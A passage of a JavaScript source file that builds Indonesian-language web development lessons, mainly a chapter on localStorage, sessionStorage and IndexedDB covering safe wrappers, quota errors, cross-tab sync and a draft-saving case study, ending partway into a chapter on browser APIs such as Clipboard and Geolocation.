        'Yang dibahas di sini hanya sisi klien. Verifikasi tanda tangan token, masa berlaku, pencabutan, rotasi token penyegar, dan deteksi pemakaian ulang semuanya adalah urusan server. Kategori Keamanan Fullstack membahasnya lengkap, dan seluruh keputusan di sub-bab ini bergantung pada server yang mengerjakan bagiannya dengan benar.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Bearer token rentan XSS; cookie `HttpOnly` rentan CSRF.',
        'Cookie `HttpOnly` + `SameSite` + anti-CSRF umumnya lebih aman untuk aplikasi web.',
        'Di mana pun token disimpan, XSS tetap bisa mencurinya — kecuali `HttpOnly`.',
        'Refresh token harus dijaga agar hanya satu yang berjalan pada satu waktu.',
        'JWT bisa dibaca siapa saja; jangan pernah menaruh rahasia di dalamnya.',
      ),
      references(
        {
          label: 'Using HTTP cookies',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies',
          source: 'MDN',
          note: 'Penanda `HttpOnly`, `Secure`, dan `SameSite` beserta perilaku bawaannya sekarang.',
        },
        {
          label: 'Authorization header',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Authorization',
          source: 'MDN',
          note: 'Bentuk baku `Bearer <token>` dan skema autentikasi lain yang tersedia.',
        },
        {
          label: 'Cross-Site Request Forgery Prevention Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Risiko utama pola cookie, beserta pola token anti-CSRF yang menutupnya.',
        },
        {
          label: 'JSON Web Token Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Kesalahan JWT yang paling sering, termasuk menaruh data rahasia di payload.',
        },
        {
          label: 'RFC 6750: Bearer Token Usage',
          href: 'https://www.rfc-editor.org/rfc/rfc6750.html',
          source: 'IETF',
          note: 'Spesifikasi resminya, termasuk penegasan bahwa pembawa token diperlakukan sebagai pemiliknya.',
        },
      ),
    ],
  ),

  written(
    'web-storage',
    'Web Storage: `localStorage`, `sessionStorage`, IndexedDB',
    20,
    'Menyimpan data di browser — beserta batas yang sering ditemukan terlambat.',
    [
      terms(
        {
          term: 'Web Storage',
          meaning:
            'Nama payung untuk `localStorage` dan `sessionStorage`. Keduanya menyimpan data **di browser pengguna**, terikat pada satu origin — data yang disimpan situs A tidak akan pernah bisa dibaca situs B.',
        },
        {
          term: 'localStorage',
          meaning:
            'Penyimpanan yang isinya **bertahan sampai dihapus**, bahkan setelah browser ditutup dan komputer dimatikan. Kapasitasnya sekitar 5–10 MB. Dua batas yang sering ditemukan terlambat: **isinya hanya bisa berupa teks**, dan **API-nya sinkron** sehingga operasi besar memblokir tampilan.',
        },
        {
          term: 'sessionStorage',
          meaning:
            'Sama seperti `localStorage`, kecuali umurnya **hanya selama tab terbuka**. Perbedaan penting lainnya: tiap tab punya salinannya sendiri yang **tidak dibagi**. Cocok untuk keadaan sementara seperti langkah formulir bertahap.',
        },
        {
          term: 'IndexedDB',
          meaning:
            'Basis data di dalam browser yang jauh lebih mampu: kapasitas ratusan megabita, bisa menyimpan **objek, Blob, dan File** apa adanya tanpa diubah jadi teks, dan **asinkron** sehingga tidak memblokir tampilan. Harganya: API bawaannya rumit, sehingga hampir semua orang memakai pembungkus seperti `idb`.',
        },
        {
          term: 'serialize',
          meaning:
            'Mengubah data menjadi teks agar bisa disimpan. Karena Web Storage hanya menerima teks, objek **wajib** melewati `JSON.stringify` dulu. Menyimpannya langsung tidak melempar error — ia diam-diam tersimpan sebagai teks `[object Object]`, dan itulah yang membuat bug ini sulit dilacak.',
        },
        {
          term: 'quota',
          meaning:
            'Terjemahannya **jatah**. Batas ruang yang diberikan browser per origin. Melewatinya membuat penulisan **melempar `QuotaExceededError`** — dan karena penyimpanan sering dianggap pasti berhasil, kegagalan ini biasanya tidak ditangani siapa pun.',
        },
        {
          term: 'input tidak tepercaya',
          meaning:
            'Sikap yang wajib diambil terhadap isi Web Storage. Pengguna bisa mengubahnya kapan saja lewat DevTools, dan versi lama aplikasimu mungkin menyimpan bentuk yang berbeda. Karena itu hasil `JSON.parse` **wajib divalidasi bentuknya**, persis seperti data dari jaringan.',
        },
        {
          term: 'storage event',
          meaning:
            'Peristiwa yang berbunyi ketika `localStorage` diubah **dari tab lain** pada origin yang sama. Berguna untuk menyelaraskan keadaan antar-tab — misalnya logout di satu tab ikut melogout tab lainnya. Perhatikan: ia **tidak** berbunyi di tab yang melakukan perubahan itu sendiri.',
        },
        {
          term: 'PII',
          meaning:
            'Singkatan *Personally Identifiable Information*, artinya **data yang bisa mengidentifikasi seseorang**. Web Storage bukan tempatnya: isinya terbaca JavaScript mana pun di halaman itu, sehingga satu celah XSS sudah cukup untuk membocorkan semuanya.',
        },
      ),

      h2('Tiga pilihan'),
      table(
        ['', '`localStorage`', '`sessionStorage`', 'IndexedDB'],
        [
          ['Umur', 'Sampai dihapus', 'Sampai tab ditutup', 'Sampai dihapus'],
          ['Kapasitas', '±5–10 MB', '±5–10 MB', 'Ratusan MB'],
          ['API', 'Sinkron', 'Sinkron', '**Asinkron**'],
          ['Tipe data', 'String saja', 'String saja', 'Objek, Blob, File'],
          ['Antar tab', 'Dibagi', 'Terpisah', 'Dibagi'],
        ],
      ),

      h2('`localStorage`'),
      code(
        'js',
        `
        localStorage.setItem('tema', 'gelap');
        localStorage.getItem('tema');       // 'gelap'
        localStorage.getItem('tidakAda');   // null
        localStorage.removeItem('tema');
        localStorage.clear();

        // Hanya menyimpan string — objek harus di-serialize
        localStorage.setItem('pengguna', JSON.stringify({ nama: 'Zum' }));
        JSON.parse(localStorage.getItem('pengguna'));

        // Menyimpan objek langsung menghasilkan ini:
        localStorage.setItem('x', { a: 1 });
        localStorage.getItem('x');          // '[object Object]'
        `,
      ),
      p(
        "Lima baris pertama adalah seluruh API-nya, sesederhana itu. Ada dua hal yang perlu dicatat. `getItem` mengembalikan **`null`** dan bukan `undefined` untuk kunci yang tidak ada, jadi pemeriksaannya sebaiknya `=== null`. Lalu `clear()` menghapus **semua** kunci milik origin itu, termasuk yang disimpan library lain, sehingga hampir selalu `removeItem` yang lebih tepat. Bagian bawah menyoroti batasan yang paling sering menggigit, yaitu `localStorage` **hanya bisa menyimpan string**. Menyimpan object tidak melempar error apa pun, karena object itu diam-diam diubah jadi teks `'[object Object]'` dan datanya hilang tanpa jejak. Karena itu `JSON.stringify` saat menyimpan dan `JSON.parse` saat membaca bukan pilihan gaya melainkan keharusan, dan pasangan itulah yang membuka tiga cara gagal di bagian berikutnya.",
      ),

      h2('Tiga cara ia gagal'),
      code(
        'js',
        `
        function simpanAman(kunci, nilai) {
          try {
            localStorage.setItem(kunci, JSON.stringify(nilai));
            return true;
          } catch (error) {
            // 1. QuotaExceededError — penyimpanan penuh
            // 2. SecurityError — diblokir mode privat / pengaturan browser
            console.error('[storage] gagal menyimpan', error);
            return false;      // beri tahu pemanggil, jangan telan diam-diam
          }
        }

        function muatAman(kunci, cadangan) {
          try {
            const mentah = localStorage.getItem(kunci);
            if (mentah === null) return cadangan;
            return JSON.parse(mentah);
          } catch {
            // 3. JSON rusak — diedit tangan, atau sisa versi lama
            return cadangan;
          }
        }
        `,
      ),
      p(
        'Ketiga kegagalan yang ditandai komentar punya sifat yang sama, yaitu **tidak satu pun terjadi di komputer kamu saat mengembangkan**. `QuotaExceededError` muncul pada pengguna yang penyimpanannya sudah penuh. `SecurityError` muncul di mode privat atau saat pengguna memblokir penyimpanan situs, dan perhatikan bahwa itu berarti `localStorage.setItem` bisa **melempar** dan bukan sekadar gagal diam-diam, sehingga tanpa `try` seluruh fungsi pemanggil ikut berhenti. Kegagalan ketiga ada di sisi baca, karena `JSON.parse` melempar bila teksnya rusak atau berasal dari versi aplikasi yang bentuk datanya berbeda. Perhatikan pembagian tanggung jawabnya. `simpanAman` mengembalikan `false` supaya pemanggil bisa memberi tahu pengguna, sedangkan `muatAman` mengembalikan nilai cadangan supaya aplikasi tetap bisa dibuka. Yang sama pentingnya, `if (mentah === null) return cadangan` menangani pemakaian pertama ketika belum ada apa pun tersimpan.',
      ),
      callout(
        'danger',
        'Data dari penyimpanan adalah input yang tidak tepercaya',
        'Ia bisa diedit lewat DevTools dalam sepuluh detik, tersisa dari versi aplikasi yang bentuk datanya berbeda, atau rusak sebagian. **Selalu validasi bentuknya setelah `JSON.parse`** — persis seperti pada respons API. Website ini melakukannya di `storageAdapter`-nya sendiri.',
      ),

      h2('Sinkron berarti memblokir'),
      code(
        'js',
        `
        // localStorage berjalan di thread yang sama dengan tampilan.
        // Menyimpan 5 MB akan membekukan halaman selama penulisan.
        // Untuk data besar atau sering berubah, pakai IndexedDB.
        `,
      ),
      p(
        'Kata "sinkron" di tabel pilihan tadi terdengar seperti kemudahan, dan memang begitu, sebab kamu bisa menulis `localStorage.getItem(...)` tanpa `await`, tanpa Promise, dan tanpa callback. Tapi konsekuensinya persis seperti loop tak berujung di Bab 1. Karena JavaScript berjalan di thread yang sama dengan tampilan, **selama penulisan berlangsung tidak ada apa pun yang bisa digambar atau diklik**. Untuk beberapa kilobyte hal ini tidak terasa. Untuk beberapa megabyte, atau untuk penulisan yang terjadi pada setiap ketikan, halaman mulai terasa tersendat tanpa penyebab yang jelas, dan ia tidak akan muncul di profil performa sebagai "kode lambat" karena yang lambat adalah operasi penyimpanannya. IndexedDB menyelesaikan ini dengan bekerja asinkron, dan itulah alasan utama memilihnya meski API-nya jauh lebih bertele-tele.',
      ),

      h2('Sinkronisasi antar tab'),
      code(
        'js',
        `
        // Terpicu di tab LAIN saat localStorage berubah — bukan di tab yang mengubahnya
        window.addEventListener('storage', (e) => {
          if (e.key === 'tema') terapkanTema(e.newValue);
        });
        `,
      ),
      p(
        'Bagian yang paling sering membingungkan disebut di komentar, yaitu peristiwa `storage` **tidak terpicu di tab yang melakukan perubahan** dan hanya di tab lain. Itu disengaja, sebab tab yang mengubah sudah tahu apa yang ia ubah, jadi memberitahunya lagi hanya akan menyebabkan pekerjaan ganda. Tapi akibatnya, mencoba menguji fitur ini dengan satu tab akan selalu terlihat "tidak jalan". Objek `e` membawa keterangan lengkap. `e.key` menyebut kunci mana yang berubah, dan pemeriksaannya perlu karena listener ini menerima **semua** perubahan penyimpanan termasuk dari library lain, sedangkan `e.newValue` dan `e.oldValue` membawa isi barunya dan lamanya. Perhatikan `e.newValue` bernilai `null` ketika kuncinya dihapus, jadi fungsi yang menerimanya perlu siap menghadapi itu. Ini cara paling sederhana membuat perubahan tema atau logout langsung tercermin di semua tab yang terbuka.',
      ),

      h2('IndexedDB, secukupnya'),
      code(
        'js',
        `
        // API bawaannya bertele-tele. Untuk pemakaian nyata, library tipis
        // seperti 'idb' membungkusnya jadi Promise.
        import { openDB } from 'idb';

        const db = await openDB('app', 1, {
          upgrade(db) { db.createObjectStore('tugas', { keyPath: 'id' }); },
        });

        await db.put('tugas', { id: '1', judul: 'Belajar' });
        await db.get('tugas', '1');
        `,
      ),
      p(
        "Perhatikan `await` di setiap baris, karena itu perbedaan paling terasa dari `localStorage`. IndexedDB bersifat **asinkron**, sehingga penulisan sebesar apa pun tidak membekukan tampilan. Perbedaan kedua ada pada bentuk datanya. `db.put` menerima **object apa adanya** tanpa `JSON.stringify` sama sekali, dan ia juga sanggup menyimpan `Blob` maupun `File`, sesuatu yang mustahil di `localStorage`. `keyPath: 'id'` memberi tahu IndexedDB bahwa property `id` pada tiap object adalah kuncinya, sehingga kamu tidak perlu menyebut kunci terpisah saat menyimpan. Angka `1` pada `openDB` adalah **versi skema**, dan fungsi `upgrade` hanya berjalan saat versinya naik. Di situlah struktur penyimpanan dibuat atau diubah, pola yang mirip migrasi database. Library `idb` dipakai di sini karena API bawaan IndexedDB berbasis event dan sangat bertele-tele, sedangkan `idb` hanya membungkusnya menjadi Promise tanpa menambah lapisan lain.",
      ),
      callout(
        'tip',
        'Kapan naik ke IndexedDB',
        'Saat kamu menyimpan lebih dari beberapa ratus kilobyte, menyimpan berkas atau gambar, atau butuh mencari dan mengurutkan data tersimpan. Selama datanya kecil dan berbentuk sederhana, `localStorage` lebih ringkas dan cukup.',
      ),

      h2('Yang TIDAK boleh disimpan'),
      ul(
        'Token autentikasi — bisa dibaca skrip mana pun (sub-bab 5.7).',
        'Kunci API atau rahasia apa pun.',
        'Data pribadi orang lain.',
        'Apa pun yang server harus percayai tanpa memverifikasinya ulang.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Formulir pengajuan klaim asuransi punya dua puluh kolom dan sering diisi berhari-hari. Pengguna mengeluh karena tab yang tidak sengaja tertutup berarti mengulang dari nol. Kamu menambahkan penyimpanan draf otomatis ke `localStorage`, dan tiga masalah muncul berurutan, yaitu mengetik terasa tersendat, draf pengguna lain muncul di komputer bersama, dan setelah beberapa minggu penyimpanan penuh sehingga tidak ada draf yang bisa disimpan lagi.',
      ),
      p(
        'Ketiganya adalah jebakan khas penyimpanan peramban, dan ketiganya punya jalan keluar yang jelas.',
      ),
      code(
        'js',
        `
        // Bungkus SEKALI, dengan tiga hal yang selalu dibutuhkan:
        // penguraian yang aman, ruang nama, dan batas usia.
        const RUANG = 'klaim';
        const USIA_MAKS_MS = 7 * 24 * 60 * 60 * 1000;

        export function simpanDraf(penggunaId, formId, data) {
          const kunci = \`\${RUANG}:\${penggunaId}:\${formId}\`;
          const isi = JSON.stringify({ data, padaMs: Date.now() });
          try {
            localStorage.setItem(kunci, isi);
            return true;
          } catch (galat) {
            if (galat.name === 'QuotaExceededError') {
              bersihkanYangLama();
              try {
                localStorage.setItem(kunci, isi);
                return true;
              } catch {
                return false;         // benar-benar penuh, beri tahu pengguna
              }
            }
            return false;             // mode privat, atau penyimpanan dimatikan
          }
        }

        export function bacaDraf(penggunaId, formId) {
          const kunci = \`\${RUANG}:\${penggunaId}:\${formId}\`;
          try {
            const teks = localStorage.getItem(kunci);
            if (teks === null) return null;              // memang belum ada
            const { data, padaMs } = JSON.parse(teks);
            if (Date.now() - padaMs > USIA_MAKS_MS) {
              localStorage.removeItem(kunci);
              return null;                                // terlalu lama, buang
            }
            return data;
          } catch {
            localStorage.removeItem(kunci);               // isinya rusak
            return null;
          }
        }
        `,
        { filename: 'src/draf/penyimpanan.js' },
      ),
      p(
        'Kunci yang memuat `penggunaId` menyelesaikan masalah kedua, yaitu draf yang bocor antar-pengguna di komputer bersama. `localStorage` terikat pada **asal**, bukan pada pengguna, sehingga siapa pun yang membuka aplikasi di peramban yang sama melihat isi yang sama. Menyertakan id pengguna di kunci membuat drafnya terpisah, dan menghapus seluruh kunci berawalan `klaim:` saat keluar menutup sisanya.',
      ),
      p(
        'Blok `catch` pada `bacaDraf` menangani isi yang rusak, dan itu bukan kasus langka. Isi penyimpanan bisa berasal dari versi aplikasi yang lebih lama dengan bentuk data berbeda, bisa disunting sendiri oleh pengguna lewat DevTools, atau bisa terpotong karena penyimpanan penuh di tengah penulisan. Memperlakukan isi rusak sebagai tidak ada draf jauh lebih baik daripada halaman yang gagal dimuat.',
      ),
      code(
        'js',
        `
        // Masalah ketiga: menulis pada tiap ketikan menahan tampilan.
        // localStorage bersifat SINKRON, jadi tiap penulisan memblokir utas utama.
        const simpanTertunda = buatDebounce((data) => {
          simpanDraf(penggunaId, formId, data);
          tandaSimpan.textContent = 'Tersimpan';
        }, 800);

        form.addEventListener('input', () => {
          tandaSimpan.textContent = 'Menyimpan…';
          simpanTertunda(bacaFormAlamat(form));
        });
        `,
        { caption: 'Debounce dari Bab 1, dipakai untuk alasan yang sangat konkret.' },
      ),
      p(
        'Sifat sinkron inilah yang membuat penyimpanan pada tiap ketikan terasa tersendat. Menulis dua puluh kolom sebagai JSON memakan waktu yang tidak seberapa, dan menulisnya enam puluh kali per menit sambil pengguna mengetik cepat sudah cukup terasa. Menunda delapan ratus milidetik setelah ketikan terakhir menurunkan jumlah penulisan menjadi sepersekian, tanpa risiko kehilangan yang berarti.',
      ),
      code(
        'text',
        `
        # Diuji di Chromium, menulis potongan 1 MB berulang:
        gagal di iterasi 4 :: QuotaExceededError: Failed to execute 'setItem'
        on 'Storage': Setting the value of 'k4' exceeded the quota.
        `,
        { caption: 'Batasnya sekitar lima megabyte per asal, dibagi seluruh isi.' },
      ),
      p(
        'Lima megabyte terdengar banyak sampai kamu menyimpan riwayat, cache respons, dan draf sekaligus. Yang perlu diingat, kuota itu **dibagi** seluruh kunci di asal yang sama, termasuk yang ditulis pustaka pihak ketiga. Karena itu fungsi `bersihkanYangLama` pada studi kasus bukan penyempurnaan melainkan bagian dari penanganan yang benar.',
      ),
      callout(
        'danger',
        'Jangan menyimpan token, kata sandi, atau data pribadi di penyimpanan peramban',
        'Seluruh isi `localStorage` dan `sessionStorage` bisa dibaca skrip mana pun di asal yang sama, dan tetap ada di disk setelah tab ditutup. Aturan project ini melarangnya tegas. Untuk data pribadi yang memang harus ada di klien, pertimbangkan `sessionStorage` yang hilang saat tab ditutup, dan tetap jangan menyimpan yang benar-benar rahasia.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat perilaku berikut diuji langsung di Chromium, dan tiga di antaranya tidak melempar apa pun.',
      ),
      code(
        'text',
        `
        localStorage.setItem('n', 42);
        const v = localStorage.getItem('n');
        console.log(typeof v, JSON.stringify(v));

        string "42"
        `,
        { caption: 'Seluruh nilai disimpan sebagai teks, apa pun yang kamu berikan.' },
      ),
      p(
        'Angka menjadi teks, boolean menjadi teks, dan object menjadi teks `[object Object]` yang isinya hilang selamanya. Kesalahan terakhir itu paling merugikan karena tidak melempar apa pun, dan datanya baru ketahuan hilang saat dibaca kembali. Selalu bungkus dengan `JSON.stringify` saat menulis dan `JSON.parse` saat membaca, dan itu berlaku juga untuk angka supaya tipenya kembali utuh.',
      ),
      code(
        'text',
        `
        const v = localStorage.getItem('tidakAda');
        console.log(JSON.stringify(v));

        null
        `,
        { caption: 'Kunci yang tidak ada menghasilkan `null`, bukan `undefined`.' },
      ),
      p(
        "Perbedaan ini penting saat kamu memakai nilai bawaan. Karena hasilnya `null` dan bukan `undefined`, bentuk `const v = localStorage.getItem('x') ?? 'bawaan'` bekerja dengan benar sebab `??` menangkap keduanya. Yang tidak bekerja adalah nilai bawaan pada pembongkaran object, sebab itu hanya berlaku untuk `undefined`, seperti sudah dibahas di Bab 1.",
      ),
      code(
        'text',
        `
        console.log(JSON.parse(localStorage.getItem('tidakAda')));

        null
        `,
        { caption: '`JSON.parse(null)` tidak melempar, dan menghasilkan `null`.' },
      ),
      p(
        "Ini perilaku yang mengejutkan dan justru menolong. `JSON.parse` mengubah argumennya menjadi teks lebih dulu, dan teks `'null'` adalah JSON yang sah. Akibatnya membaca kunci yang tidak ada lalu menguraikannya tidak melempar. Yang **melempar** adalah isi yang ada tapi bukan JSON yang sah, misalnya sisa dari versi aplikasi lama. Karena itu blok `catch` tetap diperlukan.",
      ),
      code(
        'text',
        `
        # Di jendela penyamaran sebagian peramban, atau saat penyimpanan diblokir:
        localStorage.setItem('x', '1');

        SecurityError: Failed to read the 'localStorage' property from 'Window':
        Access is denied for this document.
        `,
        { caption: 'Mengakses penyimpanan bisa melempar bahkan sebelum menulis.' },
      ),
      p(
        'Pada sebagian pengaturan privasi, sekadar **menyentuh** `localStorage` sudah melempar, bukan hanya menulis ke sana. Karena itu pembungkus yang benar membungkus pembacaan juga, bukan hanya penulisan. Aplikasi yang tidak menanganinya akan gagal total di jendela penyamaran, dan itu jenis laporan bug yang sulit direproduksi kalau kamu tidak tahu penyebabnya.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            'Object tersimpan menjadi `[object Object]`',
            'Nilai diubah menjadi teks apa adanya',
            'Selalu `JSON.stringify` saat menulis dan `JSON.parse` saat membaca',
          ],
          [
            '`QuotaExceededError`',
            'Kuota sekitar lima megabyte per asal sudah penuh',
            'Tangkap errornya, bersihkan yang lama, lalu coba sekali lagi',
          ],
          [
            '`SecurityError` saat menyentuh penyimpanan',
            'Mode privat atau penyimpanan diblokir',
            'Bungkus pembacaan dan penulisan dengan `try`',
          ],
          [
            '`SyntaxError` saat membaca draf lama',
            'Isinya dari versi aplikasi yang bentuknya berbeda',
            'Tangkap, hapus kuncinya, dan kembalikan `null`',
          ],
          [
            'Data pengguna lain muncul di komputer bersama',
            'Penyimpanan terikat asal, bukan pengguna',
            'Sertakan id pengguna di kunci, dan bersihkan saat keluar',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Penyimpanan peramban sangat mudah dipakai, dan kemudahan itu yang membuatnya sering dipakai untuk hal yang tidak semestinya.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menyimpan token sesi di `localStorage`',
            'Paling mudah dijangkau',
            'Bisa dibaca skrip apa pun di asal yang sama. Aturan project ini melarangnya',
          ],
          [
            'Menulis ke penyimpanan pada tiap ketikan',
            'Supaya tidak ada yang hilang',
            'Penulisannya sinkron dan menahan tampilan. Tunda dengan debounce',
          ],
          [
            'Memakai `localStorage` sebagai cache respons API',
            'Supaya halaman terasa cepat saat dibuka lagi',
            'Kuotanya kecil, isinya tidak pernah kedaluwarsa sendiri, dan pembacaannya sinkron. Pakai Cache API atau IndexedDB untuk itu',
          ],
          [
            'Membaca tanpa `try` karena penulisannya sudah dibungkus',
            'Yang berisiko kan menulisnya',
            'Membaca juga bisa melempar di mode privat, dan `JSON.parse` bisa melempar untuk isi yang rusak',
          ],
          [
            'Memakai kunci pendek seperti `data` atau `user`',
            'Pendek dan mudah diingat',
            'Bentrok dengan pustaka lain di asal yang sama, dan menghapus milikmu sendiri jadi sulit. Pakai awalan ruang nama',
          ],
          [
            'Mengira `sessionStorage` dibagi antar-tab',
            'Namanya menyebut sesi',
            'Ia terpisah per tab, dan bahkan dua tab dari halaman yang sama tidak berbagi. `localStorage` yang dibagi antar-tab',
          ],
        ],
      ),
      p(
        'Baris terakhir sering menjadi sumber kebingungan, dan perbedaannya bisa dimanfaatkan. Karena `localStorage` dibagi antar-tab, ada peristiwa `storage` yang dipicu di tab **lain** setiap kali nilainya berubah. Itu cara paling murah menyinkronkan keadaan antar-tab, misalnya membuat seluruh tab ikut keluar saat pengguna keluar di salah satunya. Perhatikan peristiwanya tidak dipicu di tab yang melakukan perubahannya sendiri.',
      ),
      callout(
        'tip',
        'Tiga penyimpanan untuk tiga kebutuhan yang berbeda',
        '`sessionStorage` untuk hal yang hanya berlaku selama tab terbuka, misalnya langkah keberapa dalam wisaya. `localStorage` untuk preferensi kecil yang harus bertahan, misalnya tema dan bahasa. `IndexedDB` untuk data yang besar atau banyak, sebab ia asinkron sehingga tidak menahan tampilan dan kuotanya jauh lebih besar.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        '`localStorage` hanya menyimpan string — `JSON.stringify` dulu.',
        'Ia bisa gagal karena kuota penuh atau diblokir; tangani, jangan asumsikan berhasil.',
        'Validasi bentuk data setelah `JSON.parse` — ia input tidak tepercaya.',
        'API-nya sinkron dan memblokir tampilan; data besar sebaiknya ke IndexedDB.',
        'Event `storage` hanya terpicu di tab lain.',
      ),
      references(
        {
          label: 'Window.localStorage',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage',
          source: 'MDN',
          note: 'Termasuk kapan penulisan bisa gagal dengan `QuotaExceededError`.',
        },
        {
          label: 'Window.sessionStorage',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage',
          source: 'MDN',
          note: 'Menegaskan bahwa tiap tab punya salinannya sendiri yang tidak dibagi.',
        },
        {
          label: 'IndexedDB API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API',
          source: 'MDN',
          note: 'Untuk data besar, berkas, dan pencarian — asinkron sehingga tidak memblokir tampilan.',
        },
        {
          label: 'Window: storage event',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/storage_event',
          source: 'MDN',
          note: 'Menyelaraskan keadaan antar-tab; tidak berbunyi di tab yang melakukan perubahan.',
        },
        {
          label: 'Storage for the web',
          href: 'https://web.dev/articles/storage-for-the-web',
          source: 'web.dev',
          note: 'Panduan memilih di antara ketiganya, beserta cara browser menentukan kuota.',
        },
      ),
    ],
  ),

  written(
    'web-api-lain',
    'Web API Lain: Clipboard, Geolocation, Notification, File',
    20,
    'Kemampuan browser di luar pengambilan data — dan pola izin yang berlaku untuk semuanya.',
    [
      p(
        'API berikut punya satu pola bersama: sebagian butuh **izin pengguna**, sebagian butuh **secure context** (HTTPS atau `localhost`), dan semuanya bisa ditolak. Kode yang menganggapnya selalu berhasil akan rusak di perangkat sungguhan.',
      ),

      terms(
        {
          term: 'secure context',
          meaning:
            'Terjemahannya **konteks aman**. Syarat bahwa halaman harus dimuat lewat **HTTPS** atau berjalan di `localhost`. Banyak API modern menolak bekerja di luar itu, dan alasannya masuk akal: kemampuan seperti membaca lokasi atau kamera tidak boleh dititipkan pada koneksi yang bisa disadap dan dipalsukan.',
        },
        {
          term: 'izin',
          meaning:
            'Dari *permission*. Persetujuan yang harus diberikan pengguna sebelum sebuah kemampuan bisa dipakai. Tiga keadaannya adalah `granted` yang berarti diizinkan, `denied` yang berarti ditolak, dan `prompt` yang berarti belum ditanya. Yang wajib diingat, **penolakan bersifat menetap**, sebab sekali ditolak browser tidak akan bertanya lagi sampai pengguna mengubahnya sendiri dari pengaturan.',
        },
        {
          term: 'user gesture',
          meaning:
            'Terjemahannya **tindakan langsung pengguna** — klik, ketukan, atau tekanan tombol. Sebagian API **hanya boleh dipanggil dari dalam penangan peristiwa semacam itu**, bukan dari `setTimeout` atau saat halaman dimuat. Aturan ini ada untuk mencegah situs menyalin clipboard atau meminta izin tanpa sebab yang terlihat pengguna.',
        },
        {
          term: 'navigator',
          meaning:
            'Objek browser yang menjadi **pintu masuk sebagian besar kemampuan perangkat**: `navigator.clipboard`, `navigator.geolocation`, `navigator.mediaDevices`. Namanya warisan sejarah dari Netscape Navigator, dan sudah terlanjur menjadi standar.',
        },
        {
          term: 'Clipboard API',
          meaning:
            'Kemampuan membaca dan menulis **clipboard** (tempat hasil salin-tempel). Menulis relatif mudah; **membaca** jauh lebih dibatasi karena isinya bisa saja berupa password yang baru disalin pengguna dari aplikasi lain.',
        },
        {
          term: 'Geolocation API',
          meaning:
            'Kemampuan membaca **posisi geografis** perangkat. Selalu butuh izin, selalu butuh secure context, dan **selalu bisa ditolak atau gagal** — pengguna bisa menolak, GPS bisa tidak tersedia, atau pembacaan bisa habis waktu. Ketiga kemungkinan itu wajib ditangani.',
        },
        {
          term: 'Notification API',
          meaning:
            'Kemampuan menampilkan pemberitahuan sistem di luar halaman. Aturan tak tertulis yang penting: **jangan meminta izinnya saat halaman baru dibuka**. Pengguna yang belum tahu situsmu untuk apa hampir pasti menolak, dan penolakan itu menetap.',
        },
        {
          term: 'File API',
          meaning:
            'Kumpulan kemampuan membaca berkas yang dipilih pengguna — `File`, `FileReader`, `Blob`. Perlu ditegaskan: ia hanya bisa membaca berkas yang **secara sadar dipilih pengguna** lewat dialog atau seret-lepas, bukan menjelajahi berkas di komputernya.',
        },
        {
          term: 'Blob',
          meaning:
            'Singkatan *Binary Large Object*. Wadah untuk data biner mentah — isi gambar, berkas PDF, potongan video. `File` sebenarnya adalah `Blob` yang diberi nama dan tanggal.',
        },
        {
          term: 'progressive enhancement',
          meaning:
            'Terjemahannya **peningkatan bertahap**. Prinsip membangun agar fungsi dasarnya tetap berjalan tanpa kemampuan tambahan, lalu memperkayanya kalau kemampuan itu tersedia. Wujud praktisnya di sub-bab ini: **selalu periksa keberadaan API dulu**, dan sediakan jalan lain saat izinnya ditolak.',
        },
      ),

      h2('Clipboard'),
      code(
        'js',
        `
        async function salin(teks) {
          try {
            if (!navigator.clipboard) throw new Error('Clipboard API tidak tersedia');
            await navigator.clipboard.writeText(teks);
            return true;
          } catch {
            return false;      // beri feedback, jangan pura-pura berhasil
          }
        }
        `,
      ),
      p(
        'Fungsi ini mengembalikan `true`/`false` alih-alih melempar, dan itu pilihan yang tepat untuk operasi yang **boleh gagal tanpa merusak apa pun**, sebab pemanggilnya cukup menampilkan "Tersalin" atau "Gagal menyalin". Perhatikan pemeriksaan `if (!navigator.clipboard)` di baris pertama, karena API ini benar-benar tidak ada di sebagian lingkungan, dan langsung memanggil `writeText` pada `undefined` akan melempar `TypeError` yang tidak menjelaskan apa-apa. Ini penerapan *progressive enhancement* dari kotak istilah, yaitu periksa keberadaannya dulu dan jangan berasumsi. `catch` yang kosong di sini bukan kelalaian melainkan keputusan, sebab kegagalan menyalin tidak butuh detail dan cukup diketahui bahwa ia gagal, sementara `return false` memastikan pemanggil tidak pernah menampilkan "Tersalin" untuk sesuatu yang tidak tersalin.',
      ),
      callout(
        'warning',
        'Dua syarat yang sering terlupa',
        'Clipboard API butuh **secure context** (HTTPS atau `localhost`) dan biasanya harus dipicu oleh **tindakan pengguna** — di dalam handler klik, bukan di dalam `setTimeout` atau saat halaman dimuat. Tombol salin di website ini menangani kedua kegagalan itu secara eksplisit.',
      ),

      h2('Geolocation'),
      code(
        'js',
        `
        function posisi() {
          return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
              reject(new Error('Perangkat ini tidak mendukung geolokasi'));
              return;
            }

            navigator.geolocation.getCurrentPosition(
              (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
              (err) => {
                const pesan = {
                  1: 'Izin lokasi ditolak.',
                  2: 'Lokasi tidak bisa ditentukan.',
                  3: 'Permintaan lokasi habis waktu.',
                }[err.code];
